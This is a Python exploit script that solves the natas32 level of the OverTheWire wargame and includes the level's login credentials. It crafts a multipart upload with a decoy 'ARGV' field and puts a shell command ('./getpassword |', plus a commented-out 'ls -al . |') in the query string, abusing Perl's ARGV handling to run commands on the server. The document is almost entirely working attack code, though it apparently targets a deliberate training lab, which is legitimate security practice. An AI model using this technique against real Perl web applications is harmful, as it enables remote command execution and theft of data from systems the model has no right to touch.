import requests

URL_BASE = "http://natas32.natas.labs.overthewire.org/index.pl"
AUTH = ("natas32", "Rc3837d6qd3KoW0R2IgKssMXRX06btgY")

# The target file we want to read
# target_path = "ls%20-al%20.%20|" # list cwd
target_path = "./getpassword%20|" # run binary

# --- Step 1: the query string trick ---
# A query string with no '=' gets stuffed into Perl's @ARGV.
# So the URL itself carries the "which file to read" payload.
url = f"{URL_BASE}?{target_path}"

# --- Step 2: build the multipart body by hand ---
boundary = "----WebKitFormBoundaryXXXXXXXXXXXX"  # can be anything, just be consistent

body_parts = []

# Part A: the DECOY field.
# Same name ("file") as the real upload, but plain text, no filename/content-type.
# Its value needs to be the literal string "ARGV".
body_parts.append(
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="file"\r\n'
    f'\r\n'
    f'ARGV\r\n'
)

# Part B: the REAL file upload (needs filename + content-type to look like a genuine upload).
csv_content = "1,2,3\n4,5,6\n"
body_parts.append(
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="file"; filename="test.csv"\r\n'
    f'Content-Type: text/csv\r\n'
    f'\r\n'
    f'{csv_content}\r\n'
)

# Closing boundary
body_parts.append(f'--{boundary}--\r\n')

body = "".join(body_parts).encode()

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}"
}

response = requests.post(url, auth=AUTH, headers=headers, data=body)

print("Status:", response.status_code)
print(response.text)